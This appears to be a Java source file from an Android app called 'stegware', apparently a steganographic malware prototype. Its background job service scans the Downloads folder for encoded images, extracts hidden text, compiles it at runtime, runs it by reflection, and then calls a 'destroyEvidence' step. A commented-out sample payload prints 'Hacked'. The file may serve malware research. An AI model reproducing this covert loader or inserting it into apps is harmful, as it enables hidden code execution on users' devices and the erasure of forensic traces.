package com.android.stegware_app.jobs;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;

import com.android.stegware_app.compile_utility.Compile;
import com.android.stegware_app.compile_utility.exceptions.InvalidSourceCodeException;
import com.android.stegware_app.compile_utility.exceptions.NotBalancedParenthesisException;
import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextDecodingCallback;
import com.ayush.imagesteganographylibrary.Text.ImageSteganography;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import javassist.NotFoundException;

public class MediaSearchJob extends JobService implements TextDecodingCallback {
    public static final String TAG = "MediaSearchJob";

    public static final String IMAGE_TO_FIND_NAME = "StegWare_IMG";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "onStartJob");

//        String code = "import android.util.Log; import android.content.Context; class RuntimeClass { public RuntimeClass() {} public String run(Context context) { Log.d(\"TAG_HACK\", \"Hacked\"); return \"Hacked!\"; } }";
//
//        dynamicCompiling(getApplicationContext(), code);

        try {
            getImage();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "onStopJob");
        return false;
    }

    private void getImage() throws IOException, InterruptedException {
        String path = Environment.getExternalStorageDirectory().toString() + "/" + Environment.DIRECTORY_DOWNLOADS;

        File directory = new File(path);
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                Log.d(TAG, file.getName());
                Log.d(TAG, file.getPath());
                Log.d(TAG, Uri.fromFile(file).toString());

                Thread.sleep(2000);

                if (file.getName().contains("Encoded")) {
                    Bitmap img = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.fromFile(file));
                    ImageSteganography imageSteganography = new ImageSteganography("a", img);

//                    TextDecoding textDecoding = new TextDecoding(MediaSearchJob.this, MediaSearchJob.this); // Need activity

                    //Execute Task
//                    textDecoding.execute(imageSteganography);
                }
            }
        }
    }

    private void dynamicCompiling(Context context, String code) {
        Compile compile = new Compile(context.getFilesDir(), context, code);

        try {
            compile.parseSourceCode();
            compile.assemblyCompile();
            compile.compile();
            compile.dynamicLoading(context.getCacheDir(), context.getApplicationInfo(), context.getClassLoader());
            Object obj = compile.run();

            String _result = "";

            Method method = obj.getClass().getDeclaredMethod("run", Context.class);
            _result = (String) method.invoke(obj, context);

            compile.destroyEvidence();

            Log.d(TAG, "Method res: " + _result);
        } catch (NotBalancedParenthesisException | InvalidSourceCodeException | NotFoundException | IOException | InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onStartTextEncoding() {
        //Whatever you want to do by the start of textDecoding
    }

    @Override
    public void onCompleteTextEncoding(ImageSteganography result) {
        if (result != null) {
            if (!result.isDecoded())
                Log.d(TAG, "No message found");
            else {
                if (!result.isSecretKeyWrong()) {
                    Log.d(TAG, "Decoded");

                    dynamicCompiling(getApplicationContext(), result.getMessage());
                } else {
                    Log.d(TAG, "Wrong secret key");
                }
            }
        } else {
            Log.d(TAG, "Select Image First");
        }
    }

    public String getMediaPath() {
        String downloadDirectoryPath = Environment.getExternalStorageDirectory().toString() + "/" + Environment.DIRECTORY_DOWNLOADS;
        Log.d("Files", "Path: " + downloadDirectoryPath);
        File directory = new File(downloadDirectoryPath);
        File[] files = directory.listFiles();

        assert files != null;
        Log.d("Files", "Size: " + files.length);
        for (File file : files) {
            String fileName = file.getName();
            Log.d("Files", "FileName:" + fileName);
            if (fileName.equals(IMAGE_TO_FIND_NAME)) {
                Log.d("Files", "FoundImage:" + fileName);
                return file.getAbsolutePath();
            }
        }

        return "";
    }

    public void removeMediaByPath(String absolutePath) {
        File file = new File(absolutePath);
        boolean deleted = file.delete();
        if (!deleted) {
            Log.d("Files", "Not deleted");
        } else {
            Log.d("Files", "Deleted:");
        }

    }
}
